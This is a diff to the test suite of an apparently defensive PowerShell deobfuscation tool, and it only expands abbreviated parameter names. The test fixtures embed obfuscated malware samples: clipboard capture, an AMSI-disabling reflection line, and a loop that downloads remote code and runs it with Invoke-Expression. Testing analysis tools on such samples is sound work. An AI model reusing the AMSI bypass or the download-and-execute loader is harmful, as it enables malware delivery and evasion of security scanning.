@@ -682,7 +682,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
         test = data | self.load() | str
         goal = inspect.cleandoc(
             '''
-            if (Get-Command 'Get-Clipboard' -ea 0) {
+            if (Get-Command 'Get-Clipboard' -ErrorAction 0) {
               $d = Get-Clipboard
             }
             Add-Type -AssemblyName 'System.Windows.Forms'
@@ -705,7 +705,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             """
             $mlvxprxbencyv = 1 + 1
             $wtdvfysfnlfvwzf = (2 + 2 * 2 - 2) / 2
-            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
+            $ppvvglp = New-Object -ComObject "Scripting.FileSystemObject"
             $dfe = 'http://1'
             $krswmmqghhddtt = "Math still works"
             function Galaxy { return (Get-Random).ToString() + "RandomText" }
@@ -730,7 +730,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             $chhmcwwrtyvd = "Attempting retry..."
             $vbzdfwzqdlby = New-Object System.Text.StringBuilder
             $pzkavxhrfngkm = @("one", "two", "three") | Measure-Object | ForEach-Object { $_.Count }
-            $xbddvfiqmytaj = New-Object -Com "WScript.Shell"
+            $xbddvfiqmytaj = New-Object -ComObject "WScript.Shell"
             (Get-Random -Minimum 0 -Maximum 100) | Out-Null
             [void]([Math]::Abs(-1))
             $yim = '64.47/'
@@ -795,13 +795,13 @@ class TestPs1RealWorldLarge(TestUnitBase):
             (Get-Random).GetHashCode() | Out-Null
             $jnldg = 5 -eq 5
             $nlllqdmhdpocywy = [int]"45" + 5
-            Start-Sleep -s 5
+            Start-Sleep -Seconds 5
             $rgfyxmaam = [array]::Reverse((1,2,3,4))
             $rljibuuipy = Get-Process | Select-Object -First 1
             continue
             }
             Invoke-Expression $hnuzhmo
-            Start-Sleep -s 5
+            Start-Sleep -Seconds 5
             $ilbnpkkyugskxqb = -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
             }
             $oysdesi.ReleaseMutex();
@@ -810,11 +810,11 @@ class TestPs1RealWorldLarge(TestUnitBase):
         )
         goal = inspect.cleandoc(
             """
-            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
+            $ppvvglp = New-Object -ComObject "Scripting.FileSystemObject"
             function Galaxy {
               return (Get-Random).ToString() + "RandomText"
             }
-            $Null = New-Object -Com "WScript.Shell"
+            $Null = New-Object -ComObject "WScript.Shell"
             $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
             $oysdesi = New-Object Threading.Mutex ($False, $aefqnhv)
             function Comet {
@@ -832,13 +832,13 @@ class TestPs1RealWorldLarge(TestUnitBase):
               } catch {
                 $Null = [Math]::Sqrt(36)
                 (Get-Random).GetHashCode() | Out-Null
-                Start-Sleep -s 5
+                Start-Sleep -Seconds 5
                 $Null = [array]::Reverse((1, 2, 3, 4))
                 $Null = Get-Process | Select-Object -First 1
                 continue
               }
               Invoke-Expression $hnuzhmo
-              Start-Sleep -s 5
+              Start-Sleep -Seconds 5
               $Null = -Join ((97..122) | Get-Random -Count 5 | ForEach-Object {
                 [char]$_
               })
@@ -859,7 +859,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             try {
               [ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $True)
             } catch {}
-            $fso = New-Object -Com "Scripting.FileSystemObject"
+            $fso = New-Object -ComObject "Scripting.FileSystemObject"
             $SerialNumber = $fso.GetDrive("c:\").SerialNumber
             $SerialNumber = "{0:X}" -f $SerialNumber
             $SerialNumber = [Convert]::ToInt64($SerialNumber, 16)
@@ -875,11 +875,11 @@ class TestPs1RealWorldLarge(TestUnitBase):
               try {
                 $result = $s.DownloadString($url)
               } catch {
-                Start-Sleep -s 25
+                Start-Sleep -Seconds 25
                 continue
               }
               Invoke-Expression $result
-              Start-Sleep -s 25
+              Start-Sleep -Seconds 25
             }
             $mutex.ReleaseMutex()
             $mutex.Dispose()
